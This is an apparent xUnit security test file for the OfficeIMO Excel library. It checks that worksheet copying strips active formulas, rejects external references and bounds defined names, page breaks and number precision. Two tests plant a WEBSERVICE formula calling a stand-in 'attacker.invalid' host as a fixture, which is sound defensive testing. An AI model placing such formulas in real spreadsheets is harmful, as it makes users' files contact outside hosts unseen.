using System;
using System.IO;
using System.Linq;
using DocumentFormat.OpenXml;
using DocumentFormat.OpenXml.Packaging;
using DocumentFormat.OpenXml.Spreadsheet;
using OfficeIMO.Drawing;
using OfficeIMO.Excel;
using Xunit;

namespace OfficeIMO.Tests {
    public partial class Excel {
        [Fact]
        public void Test_CrossWorkbookCopyDefaultsToValuesAndRemovesActiveFormulas() {
            string sourcePath = Path.Combine(_directoryWithFiles, "SecurityBatch08.FormulaSource.xlsx");
            string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.FormulaTarget.xlsx");

            using (var source = ExcelDocument.Create(sourcePath)) {
                source.AddWorksheet("Source").CellFormula(1, 1, "WEBSERVICE(\"https://attacker.invalid/\")");
                source.Save();
            }

            using (SpreadsheetDocument spreadsheet = SpreadsheetDocument.Open(sourcePath, true)) {
                Cell formulaCell = spreadsheet.WorkbookPart!.WorksheetParts.Single().Worksheet.Descendants<Cell>().Single();
                formulaCell.CellValue = new CellValue("7");
                formulaCell.DataType = CellValues.Number;
                spreadsheet.WorkbookPart.WorksheetParts.Single().Worksheet.Save();
            }

            Assert.Equal(ExcelWorksheetCopyMode.Values, new ExcelWorksheetCopyOptions().CopyMode);
            Assert.Equal(ExcelWorksheetCopyMode.Values, new ExcelWorkbookMergeOptions().CopyMode);

            using (var source = ExcelDocument.Load(sourcePath, new ExcelLoadOptions { AccessMode = DocumentAccessMode.ReadOnly }))
            using (var target = ExcelDocument.Create(targetPath)) {
                target.CopyWorksheetFrom(source, "Source", "Imported");
                target.Save();
            }

            using (SpreadsheetDocument spreadsheet = SpreadsheetDocument.Open(targetPath, false)) {
                Cell copiedCell = GetWorksheetPartByNameForOperations(spreadsheet, "Imported").Worksheet.Descendants<Cell>().Single();
                Assert.Null(copiedCell.CellFormula);
                Assert.Equal("7", copiedCell.CellValue?.Text);
            }
        }

        [Fact]
        public void Test_ValuesWorksheetCopyRemovesActiveTableFormulas() {
            string sourcePath = Path.Combine(_directoryWithFiles, "SecurityBatch08.TableFormulaSource.xlsx");
            string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.TableFormulaTarget.xlsx");

            using (var source = ExcelDocument.Create(sourcePath)) {
                ExcelSheet sheet = source.AddWorksheet("Source");
                sheet.CellValue(1, 1, "Name");
                sheet.CellValue(1, 2, "Result");
                sheet.CellValue(2, 1, "Ada");
                sheet.CellValue(2, 2, 7);
                sheet.AddTable("A1:B2", hasHeader: true, name: "CalculatedResults", OfficeIMO.Excel.TableStyle.TableStyleMedium2);
                source.Save();
            }

            AddTableCalculatedColumnFormula(sourcePath, "Source", "Result", "WEBSERVICE(\"https://attacker.invalid/\")");

            using (var source = ExcelDocument.Load(sourcePath, new ExcelLoadOptions { AccessMode = DocumentAccessMode.ReadOnly }))
            using (var target = ExcelDocument.Create(targetPath)) {
                target.CopyWorksheetFrom(source, "Source", "Imported");
                target.Save();
            }

            using SpreadsheetDocument spreadsheet = SpreadsheetDocument.Open(targetPath, false);
            WorksheetPart copiedPart = GetWorksheetPartByNameForOperations(spreadsheet, "Imported");
            Table copiedTable = Assert.Single(copiedPart.TableDefinitionParts).Table!;
            Assert.DoesNotContain(copiedTable.Descendants<OpenXmlElement>(), element =>
                string.Equals(element.LocalName, "calculatedColumnFormula", StringComparison.Ordinal) ||
                string.Equals(element.LocalName, "totalsRowFormula", StringComparison.Ordinal));
            Cell cachedValue = copiedPart.Worksheet.Descendants<Cell>().Single(cell => cell.CellReference?.Value == "B2");
            Assert.Null(cachedValue.CellFormula);
            Assert.Equal("7", cachedValue.CellValue?.Text);
        }

        [Fact]
        public void Test_PackageWorksheetCopyRejectsExternalWorkbookReferencesWithoutOptIn() {
            string sourcePath = Path.Combine(_directoryWithFiles, "SecurityBatch08.ExternalSource.xlsx");
            string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.ExternalTarget.xlsx");

            using (var source = ExcelDocument.Create(sourcePath)) {
                source.AddWorksheet("External").CellFormula(1, 1, "[1]Sheet1!A1");
                source.Save();
            }

            AddExternalWorkbookReference(sourcePath);
            using var sourceDocument = ExcelDocument.Load(sourcePath, new ExcelLoadOptions { AccessMode = DocumentAccessMode.ReadOnly });
            using var targetDocument = ExcelDocument.Create(targetPath);

            InvalidOperationException exception = Assert.Throws<InvalidOperationException>(() =>
                targetDocument.CopyWorksheetFrom(sourceDocument, "External", "Imported", SheetNameValidationMode.Sanitize, new ExcelWorksheetCopyOptions {
                    CopyMode = ExcelWorksheetCopyMode.Package
                }));
            Assert.Contains("CopyExternalWorkbookReferences", exception.Message, StringComparison.Ordinal);
        }

        [Fact]
        public void Test_PackageWorksheetCopyBoundsTransitiveDefinedNames() {
            string sourcePath = Path.Combine(_directoryWithFiles, "SecurityBatch08.NamesSource.xlsx");
            string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.NamesTarget.xlsx");

            using (var source = ExcelDocument.Create(sourcePath)) {
                source.AddWorksheet("Names").CellFormula(1, 1, "NameOne");
                source.Save();
            }

            AddDefinedName(sourcePath, "NameOne", "NameTwo+1");
            AddDefinedName(sourcePath, "NameTwo", "NameThree+1");
            AddDefinedName(sourcePath, "NameThree", "1");

            using var sourceDocument = ExcelDocument.Load(sourcePath, new ExcelLoadOptions { AccessMode = DocumentAccessMode.ReadOnly });
            using var targetDocument = ExcelDocument.Create(targetPath);
            int originalSheetCount = targetDocument.Sheets.Count;
            InvalidOperationException exception = Assert.Throws<InvalidOperationException>(() =>
                targetDocument.CopyWorksheetFrom(sourceDocument, "Names", "Imported", SheetNameValidationMode.Sanitize, new ExcelWorksheetCopyOptions {
                    CopyMode = ExcelWorksheetCopyMode.Package,
                    MaxDefinedNames = 2
                }));
            Assert.Contains("defined-name limit", exception.Message, StringComparison.Ordinal);
            Assert.Equal(originalSheetCount, targetDocument.Sheets.Count);
        }

        [Fact]
        public void Test_PackageWorkbookMergeSharesDefinedNameBudgetAcrossSheets() {
            string sourcePath = Path.Combine(_directoryWithFiles, "SecurityBatch08.MergeNamesSource.xlsx");
            string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.MergeNamesTarget.xlsx");

            using (var source = ExcelDocument.Create(sourcePath)) {
                source.AddWorksheet("First").CellFormula(1, 1, "FirstName");
                source.AddWorksheet("Second").CellFormula(1, 1, "ThirdName");
                source.Save();
            }

            AddDefinedName(sourcePath, "FirstName", "SecondName+1");
            AddDefinedName(sourcePath, "SecondName", "1");
            AddDefinedName(sourcePath, "ThirdName", "FourthName+1");
            AddDefinedName(sourcePath, "FourthName", "1");

            using var sourceDocument = ExcelDocument.Load(sourcePath, new ExcelLoadOptions { AccessMode = DocumentAccessMode.ReadOnly });
            using var targetDocument = ExcelDocument.Create(targetPath);
            int originalSheetCount = targetDocument.Sheets.Count;
            InvalidOperationException exception = Assert.Throws<InvalidOperationException>(() =>
                targetDocument.MergeWorkbookFrom(sourceDocument, new ExcelWorkbookMergeOptions {
                    CopyMode = ExcelWorksheetCopyMode.Package,
                    MaxDefinedNames = 3
                }));
            Assert.Contains("defined-name limit", exception.Message, StringComparison.Ordinal);
            Assert.Equal(originalSheetCount, targetDocument.Sheets.Count);
        }

        [Fact]
        public void Test_PackageWorksheetCopyIgnoresMalformedStyledRows() {
            string sourcePath = Path.Combine(_directoryWithFiles, "SecurityBatch08.MalformedRowSource.xlsx");
            string targetPath = Path.Combine(_directoryWithFiles, "SecurityBatch08.MalformedRowTarget.xlsx");

            using (var source = ExcelDocument.Create(sourcePath)) {
                ExcelSheet sheet = source.AddWorksheet("Rows");
                sheet.CellValue(1, 1, "safe");
                sheet.CellBold(1, 1, true);
                source.Save();
            }

            using (SpreadsheetDocument spreadsheet = SpreadsheetDocument.Open(sourcePath, true)) {
                Worksheet worksheet = spreadsheet.WorkbookPart!.WorksheetParts.Single().Worksheet;
                Row malformed = new Row();
                malformed.SetAttribute(new OpenXmlAttribute(string.Empty, "r", string.Empty, "not-a-row"));
                malformed.SetAttribute(new OpenXmlAttribute(string.Empty, "s", string.Empty, "not-a-style"));
                worksheet.GetFirstChild<SheetData>()!.Append(malformed);
                worksheet.Save();
            }

            using var sourceDocument = ExcelDocument.Load(sourcePath, new ExcelLoadOptions { AccessMode = DocumentAccessMode.ReadOnly });
            using var targetDocument = ExcelDocument.Create(targetPath);
            ExcelSheet copied = targetDocument.CopyWorksheetFrom(sourceDocument, "Rows", "Imported", SheetNameValidationMode.Sanitize, new ExcelWorksheetCopyOptions {
                CopyMode = ExcelWorksheetCopyMode.Package
            });
            Assert.Equal("Imported", copied.Name);
        }

        [Fact]
        public void Test_MalformedTimePeriodTokenDoesNotCrashRuleProjection() {
            using var stream = new MemoryStream();
            using ExcelDocument document = ExcelDocument.Create(stream);
            ExcelSheet sheet = document.AddWorksheet("Rules");
            sheet.CellValue(1, 1, DateTime.Today);
            sheet.AddConditionalTimePeriodRule("A1", TimePeriodValues.Today, fillColor: "C6EFCE");

            ConditionalFormattingRule rule = sheet.WorksheetPart.Worksheet
                .Descendants<ConditionalFormattingRule>()
                .Single(item => item.Type?.Value == ConditionalFormatValues.TimePeriod);
            rule.SetAttribute(new OpenXmlAttribute(string.Empty, "timePeriod", string.Empty, "attacker-token"));

            ExcelConditionalFormattingInfo projected = Assert.Single(sheet.GetConditionalFormattingRules("A1"));
            Assert.Equal("attacker-token", projected.TimePeriod);
        }

        [Fact]
        public void Test_PageBreakImageExportRejectsAggregateResultAmplification() {
            using var stream = new MemoryStream();
            using ExcelDocument document = ExcelDocument.Create(stream);
            ExcelSheet sheet = document.AddWorksheet("Pages");
            for (int row = 1; row <= 4; row++) {
                for (int column = 1; column <= 4; column++) {
                    sheet.CellValue(row, column, row * column);
                }
            }

            sheet.AddManualRowPageBreak(2, save: false);
            sheet.AddManualColumnPageBreak(2, save: false);
            InvalidOperationException exception = Assert.Throws<InvalidOperationException>(() =>
                sheet.ExportImages(OfficeImageExportFormat.Svg, new ExcelWorksheetImageExportOptions {
                    Range = "A1:D4",
                    SplitByManualPageBreaks = true,
                    MaximumPageBreakImages = 3
                }));
            Assert.Contains("configured aggregate result limit", exception.Message, StringComparison.Ordinal);
        }

        [Fact]
        public void Test_PageBreakImageExportBoundsMalformedRecordInspection() {
            using var stream = new MemoryStream();
            using ExcelDocument document = ExcelDocument.Create(stream);
            ExcelSheet sheet = document.AddWorksheet("Pages");
            sheet.CellValue(1, 1, "safe");
            var rowBreaks = new RowBreaks();
            for (uint index = 0; index < 65U; index++) {
                rowBreaks.Append(new Break {
                    Id = 10_000U + index,
                    ManualPageBreak = true
                });
            }

            sheet.WorksheetPart.Worksheet.Append(rowBreaks);
            InvalidOperationException exception = Assert.Throws<InvalidOperationException>(() =>
                sheet.ExportImages(OfficeImageExportFormat.Svg, new ExcelWorksheetImageExportOptions {
                    Range = "A1:A1",
                    SplitByManualPageBreaks = true,
                    MaximumPageBreakImages = 1
                }));
            Assert.Contains("inspection budget", exception.Message, StringComparison.Ordinal);
        }

        [Fact]
        public void Test_NumberFormatPrecisionIsBoundedBeforeAllocation() {
            Assert.Equal(30, ExcelNumberFormats.MaximumDecimalPlaces);
            Assert.Throws<ArgumentOutOfRangeException>(() => ExcelNumberFormats.Get(ExcelNumberPreset.Decimal, 31));
            Assert.Throws<ArgumentOutOfRangeException>(() => new ExcelColumnFormatPlan().Add("Value", ExcelNumberPreset.Decimal, decimals: 31));
        }
    }
}
